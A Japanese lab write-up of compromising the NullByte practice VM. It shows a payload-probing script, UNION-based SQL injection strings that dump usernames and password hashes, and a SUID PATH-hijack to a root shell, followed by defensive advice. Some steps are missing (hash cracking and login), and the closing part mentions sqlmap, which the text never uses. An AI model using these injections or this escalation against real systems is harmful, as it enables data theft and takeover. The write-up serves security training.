## はじめに
こんにちは、雨水と申します。

今回は、仮想環境上のやられサーバーに対してSQLインジェクション攻撃を行い、root権限を奪取するまでの過程を記録します。

このような仮想環境で攻撃実験を行った記事をこのほかにも書いていますので、宜しければ合わせてご覧ください。
前回記事：https://zenn.dev/rw_sec/articles/2db6e6b3bdf51d

:::message alert
本記事は、自身の管理下にある閉じた仮想ネットワーク内での実験記録です。
許可のない第三者のサーバーやネットワークに対して同様の行為を行うことは、不正アクセス禁止法により処罰の対象となります。絶対に悪用しないでください。
:::

今回の実験環境は以下の通りです。

* **ホストOS:** Windows 11
* **仮想化ソフト:** Oracle VM VirtualBox 7.0
* **攻撃機:** Parrot Security OS 5.3 (IP: 192.168.56.100)
* **ターゲット:** NullByte(仮想マシン)

### 4. SQLインジェクション攻撃

試しに何も入力せずにEnterキーを押してみると、以下のような画面が表示されました。
![alt text](/images/SQL_injection/resultusernemes.png)

空の入力を送信するとデータが出ることは立派な脆弱性の一種であり、以下のような原因が考えられます。
- バックエンドのSQLが`SELECT * FROM employees WHERE username LIKE '%[入力値]%"`のような形になっており、入力値が0の場合クエリが`LIKE "%%"` となりすべての文字列にマッチしてしまう。
- HTMLのinputタグにrequired属性がないため、ブラウザ上で空のまま送信できてしまう。
※ただし、実際の攻撃者はブラウザを通さない通信を往々にして行うためrequired属性は防御としては意味をなさないことが多い。


このようなシンプルな脆弱性が確認されたため、入力欄には更なる脆弱性が潜んでいると推測できます。

続けてSQLインジェクション攻撃を行いました。
ここで、何種類もの文字列を手動で入力して脆弱性を探すのは非効率ですので、Pythonでスクリプトを組みました。

```python
#pythonコード

import requests
import time

# ターゲットのURL
url = "http://192.168.56.109/kzMb5nVYJw/420search.php"

# 検証したいペイロードのリスト
payloads = [
    "'",
    '"',
    "'; id",
    "| whoami",
    "../../../../etc/passwd",
    "<script>alert(1)</script>"
]

print("検証開始")

for payload in payloads:

    params = {"usrtosearch": payload}
    
    try:
        # GETリクエストを送信
        response = requests.get(url, params=params, timeout=5)
        
        # 正常なレスポンス（何も入れてない時）との違いを比較するために出力
        print(f"Payload: {payload}")
        print(f"Status Code: {response.status_code}")
        print(f"Response Length: {len(response.text)}")
        print("-" * 30)
        
        time.sleep(1)
        
    except requests.exceptions.RequestException as e:
        print(f"通信エラーが発生しました: {e}")
```

`"`を入力した際に帰ってくる文字列の長さに変化があり、何か特別な挙動を示していることが分かりました。
実際に確認してみると以下のようなエラー画面が表示されていました。
![alt text](/images/SQL_injection/doublequitation_result.png)

先ほど推測した`SELECT * FROM employees WHERE username LIKE "%[入力値]%"`というSQL文の入力値に`"`を入れると後半部分が`"%"%"`となり、入力値によって文字列リテラルが意図せず閉じられ、それ以降の文字列がSQLエンジンにおいて不正な構文として解釈されるため、シンタックスエラーが発生します。
つまり、先ほど推測したSQL文と同じ、あるいは非常に近いものがこのページでは用いられていることがエラー文章から推測できます。
もしそうなら、`UNION SELECT`を用いた構文を入力値とすると内部のデータベースにアクセスする攻撃が出来そうです。

まず、入力値を`"UNION SELECT "Test1";-- -`にしてみました。
![alt text](</images/SQL_injection/UNION SELECT TEST1.png>)

TESTの数が違ったためエラーが出ました。
UNION SELECTを使用するには元のクエリとカラム数を一致させる必要があります。TESTを2個にした場合も同様にエラーが出ましたが、3個にして`"UNION SELECT "Test1","Test2","Test3";-- -`とすると攻撃に成功しデータが表示されました。

![alt text](</images/SQL_injection/UNION SELECT TEST1-3.png>)

カラム数が3つであることが判明したため、次に`information_schema`等を利用してデータベースの構造を順に列挙していきます。

#### 1. データベース名の特定
まずは現在のデータベース名やバージョン情報を特定します。
`?usrtosearch="UNION SELECT user(),@@version,database();-- -`

このペイロードを入力すると、現在のユーザーが`root@localhost`、バージョンが`5.5.44-0+deb8u1`、そして現在のデータベース名が`seth`であることが判明しました。

#### 2. テーブル名の特定
判明した`seth`データベース内に存在するテーブルを列挙します。
`?usrtosearch="UNION SELECT table_schema, table_name, null from information_schema.tables where table_schema='seth';-- -`

この結果、`seth`データベースには`users`というテーブルのみが存在することが分かりました。

#### 3. カラム名の特定
次に、ターゲットである`users`テーブル内のカラム構造を列挙します。
`?usrtosearch="UNION SELECT column_name, null, null from information_schema.columns where table_schema='seth' and table_name='users';-- -`

結果として、`id`、`user`、`pass`、`position`という4つのカラムが存在することが特定できました。

#### 4. データの抽出
これらの情報をもとに、最終的なペイロードを組み立てて`users`テーブル内のデータをすべて抽出します。
`?usrtosearch="UNION SELECT concat(id,'_',user,'_',pass,'_',position),null, null from users;-- -`

これを入力値とすると、以下のようなデータを入手できました。
![alt text](/images/SQL_injection/users_table_data.png)

ramsesユーザーは未知の文字列が設定されており、これはパスワードに関連していると推測されます。

### 5. パスワードハッシュの解析

この文字列をbase64でデコードしてみます。
```bash
┌─[✗]─[user@parrot]─[~/hacking-lab-logs/NullByte]
└──╼ $echo -n YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | base64 -d
c6d6bd7ebf806f43c76acc3681703b81base64: invalid input
```
`invalid input`というエラーが発生しました。Base64の仕様上、エンコードされた文字列の長さは4の倍数である必要があります。今回取得した文字列は43文字であったため、末尾にパディング文字(余白を埋める文字)である`=`を1つ付加して44文字に調整し、再度デコードを実行します。
```bash
┌─[✗]─[user@parrot]─[~/hacking-lab-logs/NullByte]
└──╼ $echo -n "YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE=" | base64 -d
c6d6bd7ebf806f43c76acc3681703b81
```
これで正確なMD5ハッシュ値らしき文字列`c6d6bd7ebf806f43c76acc3681703b81`を得ることに成功しました。

`procwatch`はSUIDファイルであることが分かりました。また、README.txtの内容から、このファイルには何らかのバグが存在している可能性が高いです。

さらに、`procwatch`の実行結果は`ps`コマンドの実行結果と全く同じです。実際に`ps`コマンドを実行してみると以下のようになりました。
```bash
ramses@NullByte:/var/www/backup$ ps
  PID TTY          TIME CMD
20284 pts/0    00:00:00 bash
20377 pts/0    00:00:00 ps
```
つまり、`procwatch`は内部で`ps`を呼び出している可能性が高く、前述のようにこのコマンドにはバグが存在と考えられるため、この呼び出しに何らかの脆弱性があると考えるのが自然です。
プロセス監視という要件を満たすため、本来は管理者権限が必要な情報を取得する目的でSUIDが設定されていたと推測されます。

もし procwatch が、絶対パス`/bin/ps`ではなく、単に`ps`というコマンド名だけで呼び出しを行っている場合、PATH環境変数のハイジャック攻撃が成立する可能性が極めて高くなります。

Linuxでは、コマンド名のみで実行が指示された際、環境変数 $PATH に登録されているディレクトリの順番に従って実行ファイルを探しに行く仕様になっています。

このOSの探索仕様を悪用し、攻撃者が用意した悪意のある偽の`ps`コマンドを、本来の`/bin/ps`よりも先にシステムに見つけさせることができれば、`procwatch`のSUIDによるroot権限を引き継いだまま、攻撃者が仕込んだスクリプトが実行されてしまうことになります。

この仮説を立証するため、現在の環境変数を確認し、書き込み権限のある`/tmp`ディレクトリを利用して攻撃の準備と検証を進めていきます。


まずは現在の環境で`ps`と`bash`コマンドがどのパスから呼び出されているかを確認します。
```bash
ramses@NullByte:/var/www/backup$ which ps
/bin/ps
ramses@NullByte:/var/www/backup$ which bash
/bin/bash
```
次に、PATH環境変数のハイジャックを行うための準備をします。
環境変数`$PATH`を書き換えて`/tmp`ディレクトリの優先度を一番高く設定します。その後、書き込み権限のある`/tmp`ディレクトリ配下に、中身が`/bin/sh`である偽の`ps`コマンドを作成します。
```bash
ramses@NullByte:/var/www/backup$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
ramses@NullByte:/var/www/backup$ export PATH=/tmp:$PATH
ramses@NullByte:/var/www/backup$ echo $PATH
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
ramses@NullByte:/var/www/backup$ echo "/bin/sh" > /tmp/ps
```

作成した偽の`ps`コマンドが実行できるように`chmod`で権限を付与します。
```bash
ramses@NullByte:/var/www/backup$ chmod 777 /tmp/ps
ramses@NullByte:/var/www/backup$ ls -ls /tmp/ps
4 -rwxrwxrwx 1 ramses ramses 8 Feb 27 11:38 /tmp/ps
```

これで準備は完了です。いよいよ、内部で`ps`を絶対パスなしで呼び出していると推測されるSUIDバイナリ`procwatch`を実行します。
```bash
ramses@NullByte:/var/www/backup$ ./procwatch
root@NullByte:/var/www/backup# 
```
ルートのプロンプトが返ってきました。root権限の奪取成功です。

## 考察
今回攻略したNullByteマシンにおいての特に致命的な脆弱性は、

* パスワードがクラッカーで簡単に突破される脆弱なものであったこと
* SQL文に欠陥があったこと
* SUID権限を付与しているコマンドの欠陥を放置していたこと

などが挙げられます。

### SQL文について

#### 想定されるリスク
今回のようなSQLインジェクションの脆弱性が存在すると、攻撃者にデータベース内の機密情報（顧客情報や社員のパスワードハッシュなど）が不正に入手されるリスクがあります。
さらに、データの改ざんや削除が行われたり、データベースサーバーの設定によってはOSのコマンドまで実行され、システム全体を乗っ取られる危険性も孕んでいます。

#### 具体的な防御手段
プレースホルダを用いたプリペアドステートメント（静的プレースホルダ）を使用することが推奨されます。これにより、ユーザーの入力値がSQLの構文として解釈されることを防ぎ、単なる文字列として安全に処理できます。
また、保険的な対策として、入力値の検証を厳格に行うことや、WAFを導入して不正なクエリを通信の段階で遮断することも有効です。

### SUID権限について

#### 想定されるリスク
SUIDが付与された実行ファイルは、実行したユーザーの権限に関わらず、そのファイルの所有者（多くの場合root）の権限で動作します。
このプログラム内に外部コマンドを呼び出す際のパス指定の甘さ（環境変数のハイジャック）や、バッファオーバーフローなどの脆弱性が存在すると、攻撃者に悪用されて特権レベルでの任意のコマンド実行（権限昇格）を許してしまうという、極めて深刻なリスクが生じます。

#### 具体的な防御手段
第一に「最小特権の原則」に従い、不必要なプログラムには絶対にSUIDを付与しないことが重要です。
どうしてもSUIDが必要なプログラムを運用する場合は、内部で外部コマンドを呼び出す際に必ず絶対パス（例:`/bin/ps`）を指定する必要があります。
また、プログラムの実行開始時に、攻撃者が意図的に操作できるPATH環境変数などをクリア、または安全な値に初期化する安全なコーディングを徹底することが防御に繋がります。

### まとめ
このように`sqlmap`は非常に強力で効率的なツールですが、通信量が非常に多く、実稼働している環境ではWAFやIDS等で容易に検知・遮断されてしまう可能性があります。

本編で行ったような手動でのインジェクション手法や背後にある原理を深く理解した上で、状況に応じてツールを使い分けられるようになることが、セキュアなシステム構築や正確な脆弱性診断において重要となります。
